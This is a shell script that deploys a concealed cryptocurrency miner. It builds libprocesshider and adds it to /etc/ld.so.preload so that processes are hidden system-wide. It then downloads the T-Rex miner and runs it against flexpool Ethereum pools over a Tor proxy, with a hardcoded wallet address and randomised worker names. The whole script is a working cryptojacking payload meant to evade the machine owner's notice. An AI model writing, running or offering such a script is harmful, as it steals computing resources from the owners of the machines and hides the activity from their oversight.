#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
apt update
sudo apt install libpci3
sudo apt install screen -y
apt -y install binutils cmake build-essential screen unzip net-tools curl nano tor
service tor start

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..

wget https://github.com/trexminer/T-Rex/releases/download/0.25.15/t-rex-0.25.15-linux.tar.gz
tar -xf t-rex-0.25.15-linux.tar.gz
chmod +x t-rex
sudo ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x --proxy 127.0.0.1:9050 -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --gpu-report-interval 5 --mt 1
